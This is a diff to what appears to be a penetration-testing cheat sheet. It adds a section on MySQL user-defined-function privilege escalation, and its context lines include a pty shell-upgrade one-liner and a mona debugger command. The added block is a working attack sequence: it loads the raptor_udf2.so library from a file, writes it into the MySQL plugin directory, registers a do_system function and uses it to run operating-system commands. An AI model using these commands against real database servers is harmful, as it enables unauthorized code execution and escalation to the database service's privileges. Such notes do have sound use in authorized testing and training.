@@ -276,6 +276,15 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 # We're interested in modules without protection, Read & Execute permissions
 !mona modules
 ```
+##### MySQL User Defined Fuction Privilge Escalation
+```mysql
+use mysql;
+create table npn(line blob);
+insert into npn values(load_file('/home/npn/raptor_udf2.so'));
+select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('id > /tmp/out; chown npn:npn /tmp/out');
+```
 
 ##### Finding JMP ESP Address
 ```
